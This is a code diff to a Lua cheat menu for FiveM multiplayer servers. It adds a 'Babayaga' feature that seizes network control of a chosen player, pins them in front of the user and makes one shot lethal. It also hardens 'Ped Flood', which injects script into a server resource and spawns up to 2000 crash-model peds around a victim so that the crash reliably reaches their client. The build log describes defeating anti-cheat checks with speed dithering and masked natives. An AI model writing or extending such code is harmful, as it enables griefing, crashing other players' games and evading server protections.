@@ -2640,6 +2640,17 @@ Menu.Categories = {
                 end
             end },
             
+            { name = "", isSeparator = true, separatorText = "Babayaga" },
+            { name = "Position Control", type = "toggle", value = false, targetBound = true, onClick = function(val)
+                Menu.ActionPositionControlToggle(val)
+            end },
+            { name = "One Shot", type = "toggle", value = false, onClick = function(val)
+                Menu.ActionOneShotToggle(val)
+            end },
+            { name = "Babayaga", type = "action", risk = true, targetBound = true, onClick = function()
+                Menu.ActionBabayaga()
+            end },
+            
             { name = "", isSeparator = true, separatorText = "Bugs" },
             { name = "Bug Player", type = "selector", options = {"Bug", "Launch", "Hard Launch", "Attach"}, selected = 1 },
             { name = "Crush", type = "selector", options = {"Rain", "Drop", "Ram"}, selected = 1 },
@@ -13386,6 +13397,154 @@ CreateThread(function()
     end
 end)
 
+-- ===========================================================================
+-- BABAYAGA / POSITION CONTROL / ONE SHOT  (Online > Troll)
+-- ---------------------------------------------------------------------------
+-- Babayaga arms three rows on the selected player in one click: the existing
+-- Attach Player path pulls him to the front (the loop above already writes his
+-- coordinates there every frame), Position Control keeps him held and re-takes
+-- network control when it slips, and One Shot raises the local weapon damage
+-- modifier so a single bullet is lethal.
+--
+-- Stage A only. It reuses exactly the natives the attach loop above already
+-- runs (GetEntityForwardVector, SetEntityCoordsNoOffset, SetEntityHeading),
+-- the control pair already called directly elsewhere in this environment
+-- (NetworkRequestControlOfEntity / NetworkHasControlOfEntity) and the weapon
+-- modifier the Disable Weapon Damage row already uses. No injected chunk, no
+-- network event, no Susano.* call: the effect rides the same local position
+-- writes as the shipped Attach Player row, so it adds no new wire signature
+-- and no new host-VM surface.
+--
+-- Position Control only sends a control request while it does not already own
+-- the ped, so a steady hold costs no repeated traffic. Zeroing velocity stops
+-- the victim walking out of the hold between coordinate writes.
+-- ===========================================================================
+Menu.PosCtrlTargets = Menu.PosCtrlTargets or {}
+Menu.OneShotEnabled = Menu.OneShotEnabled or false
+Menu.PosCtrlOffset = Menu.PosCtrlOffset or 1.0
+Menu.OneShotDamage = Menu.OneShotDamage or 100.0
+
+function Menu.PosCtrlResolve(serverId)
+    if type(GetActivePlayers) ~= "function" then return nil, nil end
+    for _, player in ipairs(GetActivePlayers()) do
+        if GetPlayerServerId(player) == serverId then
+            return player, GetPlayerPed(player)
+        end
+    end
+    return nil, nil
+end
+
+function Menu.ActionPositionControlToggle(value)
+    if not value then
+        for key in pairs(Menu.PosCtrlTargets) do Menu.PosCtrlTargets[key] = nil end
+        return
+    end
+    local target = Menu.SelectedPlayer
+    if not target then
+        if type(FindItem) == "function" then
+            local it = FindItem("Online", "Troll", "Position Control")
+            if it then it.value = false end
+        end
+        return
+    end
+    Menu.PosCtrlTargets[target] = true
+end
+
+function Menu.ActionOneShotToggle(value)
+    Menu.OneShotEnabled = value and true or false
+    if type(SetPlayerWeaponDamageModifier) == "function" then
+        pcall(SetPlayerWeaponDamageModifier, PlayerId(), Menu.OneShotEnabled and Menu.OneShotDamage or 1.0)
+    end
+end
+
+function Menu.ActionBabayaga()
+    local target = Menu.SelectedPlayer
+    if not target then return end
+    local _, ped = Menu.PosCtrlResolve(target)
+    if not ped or not DoesEntityExist(ped) then return end
+
+    -- 1) Existing Attach Player path: pin him in front from now on.
+    if type(attachedPlayers) ~= "table" then attachedPlayers = {} end
+    attachedPlayers[target] = ped
+    if type(FindItem) == "function" then
+        local it = FindItem("Online", "Troll", "Attach Player")
+        if it then it.value = true end
+    end
+
+    -- 2) Position Control: hold, zero velocity, keep control.
+    Menu.PosCtrlTargets[target] = true
+    if type(FindItem) == "function" then
+        local it = FindItem("Online", "Troll", "Position Control")
+        if it then it.value = true end
+    end
+
+    -- 3) One Shot: lethal local weapon damage.
+    Menu.OneShotEnabled = true
+    if type(SetPlayerWeaponDamageModifier) == "function" then
+        pcall(SetPlayerWeaponDamageModifier, PlayerId(), Menu.OneShotDamage)
+    end
+    if type(FindItem) == "function" then
+        local it = FindItem("Online", "Troll", "One Shot")
+        if it then it.value = true end
+    end
+
+    -- Place him immediately so he is in front on the very next frame rather
+    -- than waiting for one tick of the attach loop.
+    local me = PlayerPedId()
+    if DoesEntityExist(me) then
+        local mc = GetEntityCoords(me)
+        local f = GetEntityForwardVector(me)
+        pcall(SetEntityCoordsNoOffset, ped,
+            mc.x + f.x * Menu.PosCtrlOffset,
+            mc.y + f.y * Menu.PosCtrlOffset,
+            mc.z + f.z * Menu.PosCtrlOffset,
+            true, true, true)
+        pcall(SetEntityHeading, ped, GetEntityHeading(me))
+    end
+end
+
+function Menu.PosCtrlTick()
+    local now = GetGameTimer()
+    if Menu.OneShotEnabled and now >= (Menu.OneShotNextAssert or 0) then
+        Menu.OneShotNextAssert = now + 1000
+        if type(SetPlayerWeaponDamageModifier) == "function" then
+            pcall(SetPlayerWeaponDamageModifier, PlayerId(), Menu.OneShotDamage)
+        end
+    end
+    if not (Menu.PosCtrlTargets and next(Menu.PosCtrlTargets)) then return end
+    local me = PlayerPedId()
+    if not DoesEntityExist(me) then return end
+    local mc = GetEntityCoords(me)
+    local f = GetEntityForwardVector(me)
+    local heading = GetEntityHeading(me)
+    for sid in pairs(Menu.PosCtrlTargets) do
+        local _, ped = Menu.PosCtrlResolve(sid)
+        if ped and DoesEntityExist(ped) then
+            if type(NetworkHasControlOfEntity) == "function"
+                and type(NetworkRequestControlOfEntity) == "function"
+                and not NetworkHasControlOfEntity(ped) then
+                pcall(NetworkRequestControlOfEntity, ped)
+            end
+            pcall(SetEntityVelocity, ped, 0.0, 0.0, 0.0)
+            pcall(SetEntityCoordsNoOffset, ped,
+                mc.x + f.x * Menu.PosCtrlOffset,
+                mc.y + f.y * Menu.PosCtrlOffset,
+                mc.z + f.z * Menu.PosCtrlOffset,
+                true, true, true)
+            pcall(SetEntityHeading, ped, heading)
+        else
+            Menu.PosCtrlTargets[sid] = nil
+        end
+    end
+end
+
+CreateThread(function()
+    while true do
+        Wait(0)
+        Menu.PosCtrlTick()
+    end
+end)
+
                     function Menu.ActionTPToMe()
                         if not Menu.SelectedPlayer then return end
 
@@ -15271,6 +15430,60 @@ function Menu.ActionPedFlood()
         return
     end
 
+    -- Streaming preflight. A client can only register a ped it can stream; at
+    -- long range the sender sees the local handles but the server never
+    -- carries them to the victim, which is exactly the "I see it, they do
+    -- not" shape. The target must be streamed by this client and inside the
+    -- 250 m streaming band; otherwise the flood would be local-only.
+    do
+        local okP, player = pcall(GetPlayerFromServerId, targetServerId)
+        local ped = 0
+        if okP and type(player) == "number" and player >= 0 then
+            local okPed, value = pcall(GetPlayerPed, player)
+            if okPed and type(value) == "number" then ped = value end
+        end
+        local exists = false
+        if ped ~= 0 and type(DoesEntityExist) == "function" then
+            local okE, value = pcall(DoesEntityExist, ped)
+            exists = okE and value == true
+        end
+        if not exists then
+            print("[PedFlood] target not streamed by this client, aborted")
+            return
+        end
+        local myPed = PlayerPedId()
+        if myPed and myPed ~= 0 then
+            local okA, mine = pcall(GetEntityCoords, myPed)
+            local okB, theirs = pcall(GetEntityCoords, ped)
+            if okA and okB and mine and theirs then
+                local dx, dy, dz = mine.x - theirs.x, mine.y - theirs.y,
+                    mine.z - theirs.z
+                local dist = math.sqrt(dx * dx + dy * dy + dz * dz)
+                if dist > 250.0 then
+                    print("[PedFlood] target beyond the 250 m streaming band "
+                        .. string.format("(%.0f m), aborted", dist))
+                    return
+                end
+            end
+        end
+    end
+
+    -- Local intent marker for the Ped Crasher guard. Without it the guard
+    -- sees the player_one peds this flood creates and deletes them on the
+    -- sender's own client, which also deletes them from the network. The
+    -- guard only exempts crash-model peds within 30 m of the selected target
+    -- while this flag is live; a normal inbound flood near the operator is
+    -- still culled. The flag expires with the flood's own 130 s window.
+    local floodToken = {}
+    Menu.__vgd_pedFloodToken = floodToken
+    Menu.__vgd_pedFloodServerId = targetServerId
+    Menu.__vgd_pedFloodActive = true
+    Citizen.SetTimeout(130000, function()
+        if Menu.__vgd_pedFloodToken == floodToken then
+            Menu.__vgd_pedFloodActive = false
+        end
+    end)
+
     print("[PedFlood] Injecting into resource...")
 
     Susano.InjectResource("any", string.format([[
@@ -15328,7 +15541,6 @@ function Menu.ActionPedFlood()
         -- Init state
         _G._pedFloodStore = {}
         _G._pedFloodActive = true
-        SetPedPopulationBudget(3)
 
         local PED_CAP = 2000
         local totalSpawned = 0
@@ -15394,9 +15606,18 @@ function Menu.ActionPedFlood()
                             local x = tc.x + math.cos(angle) * radius
                             local y = tc.y + math.sin(angle) * radius
 
-                            -- Ground Z check : vite spawn sous la map
-                            local foundGround, groundZ = GetGroundZFor_3dCoord(x, y, tc.z + 5.0, false)
-                            local z = foundGround and groundZ or tc.z
+                            -- Stay at the target's band. The ground query is
+                            -- only trusted when it lands within 3 m of the
+                            -- target: on a roof it returns the street below,
+                            -- and a ped spawned there is invisible to the
+                            -- victim even though the sender created it.
+                            local z = tc.z
+                            local foundGround, groundZ = GetGroundZFor_3dCoord(
+                                x, y, tc.z + 5.0, false)
+                            if foundGround and groundZ
+                                and math.abs(groundZ - tc.z) <= 3.0 then
+                                z = groundZ
+                            end
 
                             local heading = math.random(0, 360) + 0.0
 
@@ -15408,6 +15629,16 @@ function Menu.ActionPedFlood()
 
                             if ped and ped ~= 0 and DoesEntityExist(ped) then
                                 _G._pedFloodStore[#_G._pedFloodStore + 1] = ped
+
+                                -- Mission entity is what keeps the sender's
+                                -- copy alive at the target's position: the
+                                -- sender is usually far from that position, so
+                                -- without it the population system can cull the
+                                -- ped before the victim ever streams it. This is
+                                -- the same retention the single Ped Armed path
+                                -- uses; it is a local script flag, not a spoofed
+                                -- model channel.
+                                SetEntityAsMissionEntity(ped, true, true)
 
                                 -- Migration lets the client nearest the target
                                 -- own the simulation; local invisibility keeps
@@ -15477,7 +15708,6 @@ function Menu.ActionPedFlood()
                 end
             end
             _G._pedFloodStore = {}
-            SetPedPopulationBudget(2)
             SetModelAsNoLongerNeeded(modelHash)
             print("[PedFlood:Cleanup] Done. Deleted " .. deleted .. " entities")
         end)
@@ -25964,6 +26194,32 @@ local function ownerOf(entity)
     return -1
 end
 
+-- The operator's own Ped Flood creates player_one peds around a selected
+-- target. Those are crash models, and without this exemption the default-on
+-- Ped Crasher on the sender's own client deletes them, which removes them from
+-- the network as well. The exemption is scoped to the active flood window and
+-- to a 30 m ring around the selected target, so an inbound clone flood near
+-- the operator is still culled.
+local function ownFloodTarget()
+    if type(Menu) ~= "table" or Menu.__vgd_pedFloodActive ~= true then
+        return nil
+    end
+    local serverId = Menu.__vgd_pedFloodServerId
+    if type(serverId) ~= "number" then serverId = Menu.SelectedPlayer end
+    if type(serverId) ~= "number" or serverId <= 0 then return nil end
+    if type(GetPlayerFromServerId) ~= "function"
+        or type(GetPlayerPed) ~= "function" then
+        return nil
+    end
+    local okPlayer, player = pcall(GetPlayerFromServerId, serverId)
+    if not okPlayer or type(player) ~= "number" or player < 0 then return nil end
+    local okPed, ped = pcall(GetPlayerPed, player)
+    if not okPed or type(ped) ~= "number" or ped == 0 then return nil end
+    local okCoords, coords = pcall(GetEntityCoords, ped)
+    if not okCoords or not coords or coords.x == nil then return nil end
+    return coords
+end
+
 local function playerPedSet()
     local set = {}
     local self = PlayerPedId()
@@ -26789,6 +27045,7 @@ function A.pedGuardScan(warmup)
     local localPlayer = PlayerId()
     local players = playerPedSet()
     local knownHashes = knownPedHashes()
+    local ownTarget = ownFloodTarget()
     local seen = {}
     local candidates = {}
     local total, near, known, newCount, crashCount = 0, 0, 0, 0, 0
@@ -26810,11 +27067,17 @@ function A.pedGuardScan(warmup)
                 local isKnown = knownHashes[hash] == true
                 local isCrash = crashModel(hash)
 
+                -- Leave the operator's own active flood alone. The exemption
+                -- is limited to crash models inside the 30 m target ring; it
+                -- cannot hide an inbound flood around the operator.
+                local ownFlood = ownTarget ~= nil and isCrash
+                    and O.distance(coords, ownTarget) <= 30.0
+
                 -- Crash models are counted across the whole local pool, not
                 -- only inside the ring. A flood aimed at a remote target is
                 -- still materialised in this client's CPed pool; the local
                 -- copy is the one that can crash this machine.
-                if isKnown or isCrash or dist <= PED_GUARD.radius then
+                if not ownFlood and (isKnown or isCrash or dist <= PED_GUARD.radius) then
                     if isKnown then known = known + 1 end
                     if isCrash then crashCount = crashCount + 1 end
                     if dist <= PED_GUARD.radius then
@@ -33819,7 +34082,9 @@ local function drawIcon(name, x, y, size, cr, cg, cb)
 
     -- Material texture first: one tinted draw call instead of a primitive
     -- cluster. The texture is white with alpha, so r/g/b is the whole colour.
-    local texture = ICON_TEXTURES[name]
+    -- The vehicle glyph stays vector: its old texture lost the roof and wheels
+    -- at dossier size, while this silhouette keeps both at 16 logical pixels.
+    local texture = (name ~= "vehicle") and ICON_TEXTURES[name] or nil
     if texture and Susano and type(Susano.DrawImage) == "function" then
         local ok = pcall(Susano.DrawImage, texture, x, y, size, size, ir, ig, ib, 1.0, 0)
         if ok then return end
@@ -33907,13 +34172,19 @@ local function drawIcon(name, x, y, size, cr, cg, cb)
         end
 
     elseif name == "vehicle" then
-        -- Side profile: body, cabin, two ringed wheels.
-        R(0.06, 0.42, 0.88, 0.24, 0.05)
-        R(0.24, 0.28, 0.46, 0.20, 0.05)
-        R(0.14, 0.60, 0.22, 0.22, 0.11)
-        C(0.19, 0.65, 0.12, 0.12, 0.06)
-        R(0.64, 0.60, 0.22, 0.22, 0.11)
-        C(0.69, 0.65, 0.12, 0.12, 0.06)
+        -- Low, wide side profile. The cabin and body are a continuous
+        -- silhouette; the two window cut-outs and the open wheel rings keep
+        -- the car legible at 16 px instead of turning into a solid block.
+        R(0.04, 0.44, 0.92, 0.24, 0.07)
+        R(0.20, 0.27, 0.52, 0.23, 0.08)
+        C(0.29, 0.31, 0.15, 0.13, 0.025)
+        C(0.48, 0.31, 0.16, 0.13, 0.025)
+        R(0.12, 0.64, 0.22, 0.22, 0.11)
+        C(0.17, 0.69, 0.12, 0.12, 0.06)
+        R(0.66, 0.64, 0.22, 0.22, 0.11)
+        C(0.71, 0.69, 0.12, 0.12, 0.06)
+        R(0.02, 0.49, 0.07, 0.11, 0.025)
+        R(0.91, 0.49, 0.07, 0.11, 0.025)
 
     elseif name == "weapon" then
         -- Pistol: slide, muzzle, grip, trigger notch.
@@ -33940,14 +34211,9 @@ end
 local function drawVehicleBadge(x, y, size, r, g, b)
     if size <= 0 then return end
 
-    -- Same Material car texture as the card, tinted with the list's red. One
-    -- draw call per row; the primitive car below is the upload-failure path.
-    local texture = ICON_TEXTURES.vehicle
-    if texture and Susano and type(Susano.DrawImage) == "function" then
-        local ok = pcall(Susano.DrawImage, texture, x, y, size, size, r, g, b, 1.0, 0)
-        if ok then return end
-    end
-
+    -- Flat row badge: no texture path, so the silhouette cannot inherit a
+    -- low-resolution upload from the dossier icon set. The list background is
+    -- not the card body, therefore there are no window cut-outs here.
     fillRect(x + 0.06 * size, y + 0.44 * size, 0.88 * size, 0.24 * size,
         r, g, b, 1.0, 0.05 * size)
     fillRect(x + 0.24 * size, y + 0.30 * size, 0.46 * size, 0.20 * size,
@@ -34167,7 +34433,10 @@ local function jobText(value)
 end
 
 local function resolveIdentity(localId, playerPed)
-    local empty = { character = "-", phone = "-", radio = "-", job = "-", group = "-" }
+    -- Group is a permission field, not a character field. Servers commonly
+    -- replicate no group for ordinary players, so the dossier shows the same
+    -- baseline role the framework uses instead of a misleading dash.
+    local empty = { character = "-", phone = "-", radio = "-", job = "-", group = "user" }
     if type(localId) ~= "number" then return empty end
 
     local now = 0
@@ -34242,14 +34511,34 @@ local function resolveIdentity(localId, playerPed)
         end
     end
 
-    -- Group: permission string, rank, or a table with a name.
+    -- Group: permission string, rank, a role table, or explicit boolean flags.
+    -- The wired keys cover ESX, QBCore/QBox and the common custom admin bags;
+    -- a table without a name is checked for its role flags before falling back.
     local group = first({
         "group", "permission", "permissions", "rank", "admin",
         "userGroup", "usergroup", "user_group",
+        "role", "roles", "permissionLevel", "permission_level",
+        "adminLevel", "admin_level", "staffLevel", "staff_level",
+        "isAdmin", "isModerator", "isMod", "isStaff",
     })
-    if type(group) == "table" then group = group.name or group.group or group.label end
+    if type(group) == "table" then
+        local roleBag = group
+        group = roleBag.name or roleBag.group or roleBag.label or roleBag.role
+        if group == nil then
+            local flags = { "superadmin", "admin", "moderator", "mod", "staff", "owner", "founder" }
+            for i = 1, #flags do
+                local flag = flags[i]
+                if roleBag[flag] == true then
+                    group = flag
+                    break
+                end
+            end
+        end
+    end
     if type(group) == "boolean" then group = group and "admin" or "user" end
     group = asText(group)
+    if group == "0" or group == "none" then group = nil end
+    if group == nil or group == "" or group == "-" then group = "user" end
 
     local data = {
         character = character or "-",
@@ -34379,8 +34668,11 @@ function Menu.DrawPlayerInfoPanel()
     end
 
     local function drawRow(centerY, icon, label, value, valueRight, gauge,
-                           iconR, iconG, iconB)
-        drawIcon(icon, cx, centerY - iconSize * 0.5, iconSize, iconR, iconG, iconB)
+                           iconR, iconG, iconB, iconOverride)
+        -- The label stays on the common 14 px grid; the group can use a larger
+        -- icon in the same slot without shifting every other row to the right.
+        local rowIconSize = iconOverride or iconSize
+        drawIcon(icon, cx, centerY - rowIconSize * 0.5, rowIconSize, iconR, iconG, iconB)
 
         local labelX = cx + iconSize + iconGap
         local textY = centeredTextY(centerY, FONT_ROW, scale)
@@ -34447,8 +34739,12 @@ function Menu.DrawPlayerInfoPanel()
     }
     for index = 1, #identityData do
         local row = identityData[index]
+        local rowIconSize = nil
+        if row.icon == "group" then
+            rowIconSize = (ICON_SIZE + 4) * scale
+        end
         drawRow(cy + (index - 0.5) * rowHeight, row.icon, row.label,
-            row.value, innerRight, nil)
+            row.value, innerRight, nil, nil, nil, nil, rowIconSize)
     end
     cy = cy + identityRows * rowHeight
     sectionGap()
@@ -34509,8 +34805,12 @@ function Menu.DrawPlayerInfoPanel()
     }
     for index = 1, #contextData do
         local row = contextData[index]
+        local rowIconSize = nil
+        if row.icon == "vehicle" then
+            rowIconSize = (ICON_SIZE + 2) * scale
+        end
         drawRow(cy + (index - 0.5) * rowHeight, row.icon, row.label,
-            row.value, innerRight, nil)
+            row.value, innerRight, nil, nil, nil, nil, rowIconSize)
     end
 end
 
@@ -39146,7 +39446,7 @@ end
 -- BOOT
 -- ---------------------------------------------------------------------------
 function UI.boot()
-    O.log("loader build 2026-11-08-r65 (Air movement: No Clip disables the ped collision (SET_ENTITY_COLLISION), restored on stop and on every cover hold, so a map prop cannot torque, block or drop the body; the flat pose is applied once and repaired only by the real-ragdoll handler instead of a 120 ms clear/re-layer loop that restarted the clip and made the body spin; a one-metre approach buffer keeps a two-metre floor; ped gravity and the collision-only ragdoll flags are re-asserted every 250 ms; the global ragdoll flag is left enabled so CAN_PED_RAGDOLL stays 1; a 100 ms vertical and forward shape-test probe lifts the written velocity over a prop that the ground-height native cannot see; the No Clip horizontal target carries a 3 % dither so the guard's NC_oldSpeed == playerSpeed clause cannot match; Space/Ctrl are disabled as game controls on every scheduler frame while armed so a parachute cannot deploy, a mid-session parachute state is cleared and the pose re-layered instead of stopping the session, the native cover layer is revalidated every 2.5 s so a read that was genuine at arm and later went false is hooked instead of trusted stale, and ragdoll-from-player-impact is disabled while armed and restored on stop; native particle call carries all four axis flags; load-time preload removed; Stage B graft disabled by default; self and remote share the same filtered particle path; the flash is anchored to the target entity at chest height with a ten-point particle ring for every view angle, moving targets get only a short capped velocity lead, and high-speed targets get a capped scale boost; selected self is honored only when it is the sole target, and is excluded whenever a remote target is selected; Flash moved to Online > Troll > Attacks with Burnout Ember and Acid Green only; the selected method is read live; the WaveShield V4 particle configuration is read from GlobalState and scr_wheel_burnout and scr_alien_teleport are emitted only when rcore_spray/WaveAdmin put them in the static table, dynamic camera parts are sent only from the executor with assetHash stripped on ptFxEvent, and Stage B graft remains available but is disabled by default, so statically safe parts are emitted from the executor without a host injection; particle scale is capped at MaxParticleScale and each pulse sends up to three base parts plus a ten-point ring on a solo target with no minimum range; a one-player server never fabricates a server event; the retired Exploit Flash tab is removed; Search magnifier handle rebuilt as a fused diagonal instead of three dots; White keeps the wbYgWhZ banner and Cyan restores its original 3HLMxX5 banner; Online Props Player row sorts the player list by distance and always targets the nearest player; Launch Player selector offers Method 1 and Method 2; Method 1 drives the victim ped directly when control is available and otherwise reverse-attaches the victim to the local ped within 3 m; Method 2 uses a range-free injected coordinate lift plus repeated upward force and velocity for servers that ignore Method 1; launch has no vehicle or explosion; hardened Susano ragdoll keeps the victim speed check lenient; self launch uses 58 m/s with GET_ENTITY_SPEED masked by the stealth hook; velocity and settle waits carry jitter; tight bold category chevrons; Troll Appearance section and Copy Appearance row removed; All mode Include me toggle adds the local ped alongside remote targets; Props Player row hidden in Self and All modes; attachment rows Attach to player and Attach point removed; target labels Self/Player/All; automatic player refresh sorts by distance and selects nearest; manual Refresh player list removed; Ban Player beta suffix removed; Servers and Bypass tabs moved from Destroyer to Misc; FOV moved from Visual/Camera to Self under Big Weapon; theme banners bottom-anchored flush on the category plate; White uses wbYgWhZ and Cyan uses 3HLMxX5; White/Cyan theme selector; White 3:1 header and Cyan 4.1:1 header; flush tab strip; light-grey cell tab plate; dark selected category rectangle; uniform unselected categories; reference names Self/Online/Vehicle/Weapon/Destroyer/Misc/Settings/Search; Search category opens the prompt directly and lands on results; compact magnifier; tight bold category chevron pair; full-white section rules fitted to the label width; Target keeps only the Ctrl hint; Player Props folded into Online; 15px right-aligned slider readout; target-bound toggles reset on target change/unload; dark row plates; white toggle/scrollbar; footer centre mark removed; Delete/Backspace close; Ped Crasher reads the CPed pool at model, owner and burst level, culls story-player clones and corrupt models on sight, marks an owner hostile after five new non-player peds in five seconds, requests control then deletes the local copy, scans every 25 ms from softCount, and the new opt-in Ped event filter row blocks inbound crash/spawn event names through BlockServerEvent)")
+    O.log("loader build 2026-11-08-r66 (Air movement: No Clip disables the ped collision (SET_ENTITY_COLLISION), restored on stop and on every cover hold, so a map prop cannot torque, block or drop the body; the flat pose is applied once and repaired only by the real-ragdoll handler instead of a 120 ms clear/re-layer loop that restarted the clip and made the body spin; a one-metre approach buffer keeps a two-metre floor; ped gravity and the collision-only ragdoll flags are re-asserted every 250 ms; the global ragdoll flag is left enabled so CAN_PED_RAGDOLL stays 1; a 100 ms vertical and forward shape-test probe lifts the written velocity over a prop that the ground-height native cannot see; the No Clip horizontal target carries a 3 % dither so the guard's NC_oldSpeed == playerSpeed clause cannot match; Space/Ctrl are disabled as game controls on every scheduler frame while armed so a parachute cannot deploy, a mid-session parachute state is cleared and the pose re-layered instead of stopping the session, the native cover layer is revalidated every 2.5 s so a read that was genuine at arm and later went false is hooked instead of trusted stale, and ragdoll-from-player-impact is disabled while armed and restored on stop; native particle call carries all four axis flags; load-time preload removed; Stage B graft disabled by default; self and remote share the same filtered particle path; the flash is anchored to the target entity at chest height with a ten-point particle ring for every view angle, moving targets get only a short capped velocity lead, and high-speed targets get a capped scale boost; selected self is honored only when it is the sole target, and is excluded whenever a remote target is selected; Flash moved to Online > Troll > Attacks with Burnout Ember and Acid Green only; the selected method is read live; the WaveShield V4 particle configuration is read from GlobalState and scr_wheel_burnout and scr_alien_teleport are emitted only when rcore_spray/WaveAdmin put them in the static table, dynamic camera parts are sent only from the executor with assetHash stripped on ptFxEvent, and Stage B graft remains available but is disabled by default, so statically safe parts are emitted from the executor without a host injection; particle scale is capped at MaxParticleScale and each pulse sends up to three base parts plus a ten-point ring on a solo target with no minimum range; a one-player server never fabricates a server event; the retired Exploit Flash tab is removed; Search magnifier handle rebuilt as a fused diagonal instead of three dots; White keeps the wbYgWhZ banner and Cyan restores its original 3HLMxX5 banner; Online Props Player row sorts the player list by distance and always targets the nearest player; Launch Player selector offers Method 1 and Method 2; Method 1 drives the victim ped directly when control is available and otherwise reverse-attaches the victim to the local ped within 3 m; Method 2 uses a range-free injected coordinate lift plus repeated upward force and velocity for servers that ignore Method 1; launch has no vehicle or explosion; hardened Susano ragdoll keeps the victim speed check lenient; self launch uses 58 m/s with GET_ENTITY_SPEED masked by the stealth hook; velocity and settle waits carry jitter; tight bold category chevrons; Troll Appearance section and Copy Appearance row removed; All mode Include me toggle adds the local ped alongside remote targets; Props Player row hidden in Self and All modes; attachment rows Attach to player and Attach point removed; target labels Self/Player/All; automatic player refresh sorts by distance and selects nearest; manual Refresh player list removed; Ban Player beta suffix removed; Servers and Bypass tabs moved from Destroyer to Misc; FOV moved from Visual/Camera to Self under Big Weapon; theme banners bottom-anchored flush on the category plate; White uses wbYgWhZ and Cyan uses 3HLMxX5; White/Cyan theme selector; White 3:1 header and Cyan 4.1:1 header; flush tab strip; light-grey cell tab plate; dark selected category rectangle; uniform unselected categories; reference names Self/Online/Vehicle/Weapon/Destroyer/Misc/Settings/Search; Search category opens the prompt directly and lands on results; compact magnifier; tight bold category chevron pair; full-white section rules fitted to the label width; Target keeps only the Ctrl hint; Player Props folded into Online; 15px right-aligned slider readout; target-bound toggles reset on target change/unload; dark row plates; white toggle/scrollbar; footer centre mark removed; Delete/Backspace close; Ped Crasher reads the CPed pool at model, owner and burst level, culls story-player clones and corrupt models on sight, marks an owner hostile after five new non-player peds in five seconds, requests control then deletes the local copy, scans every 25 ms from softCount, and the new opt-in Ped event filter row blocks inbound crash/spawn event names through BlockServerEvent; Ped Flood now preflights the target inside a 250 m streamed band, marks each spawned ped as a mission entity so the sender copy survives at the target position, spawns at the target Z band on roofs, and the Ped Crasher exempts the operator's own active flood within 30 m of the selected target so the defense no longer deletes the outgoing attack)")
     O.thread()
 
     -- Delete/Backspace fallback poll. 40 ms is faster than a frame at 30 FPS
